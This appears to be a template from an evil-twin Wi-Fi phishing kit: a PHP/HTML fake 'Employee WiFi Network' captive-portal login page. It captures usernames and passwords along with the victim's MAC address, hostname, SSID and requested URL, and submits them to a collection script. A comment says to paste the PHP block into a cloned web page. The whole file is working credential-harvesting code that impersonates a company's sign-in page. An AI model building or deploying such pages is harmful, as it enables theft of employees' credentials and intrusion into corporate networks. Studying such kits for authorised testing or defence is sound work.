<?php
// copy and paste this whole PHP code block at the beginning of the cloned web page
include_once './helper.php';
header('Cache-Control: no-cache, no-store, must-revalidate');
header('Pragma: no-cache');
header('Expires: 0');
$inputValues = array(
    'mac' => getClientMac($_SERVER['REMOTE_ADDR']),
    'host' => getClientHostName($_SERVER['REMOTE_ADDR']),
    'ssid' => getClientSSID($_SERVER['REMOTE_ADDR']),
    // used to redirect the user to the web page he initially requested for
    'target' => (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']
);
?>
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<title>Company&#8482; | Employee WiFi Network</title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<link rel="stylesheet" href="./css/main.css" hreflang="en" type="text/css" media="all">
	</head>
	<body class="background-img">
		<div class="front-form">
			<div class="layout">
				<div class="logo">
					<img src="./img/logo.png" alt="Logo">
				</div>
				<header>
					<h1 class="title">Company&#8482;</h1>
					<h1 class="subtitle">Employee WiFi Network</h1>
				</header>
				<form method="post" action="./captiveportal/index.php">
					<!-- make sure you correctly modify form input fields on the cloned web page -->
					<input name="username" id="username" type="text" maxlength="50" spellcheck="false" placeholder="Username" required="required">
					<input name="password" id="password" type="password" maxlength="50" placeholder="Password" required="required">
					<input name="mac" id="mac" type="hidden" value="<?php echo $inputValues['mac']; ?>">
					<input name="host" id="host" type="hidden" value="<?php echo $inputValues['host']; ?>">
					<input name="ssid" id="ssid" type="hidden" value="<?php echo $inputValues['ssid']; ?>">
					<input name="target" id="target" type="hidden" value="<?php echo $inputValues['target']; ?>">
					<input type="submit" value="Sign In">
				</form>
			</div>
		</div>
	</body>
</html>
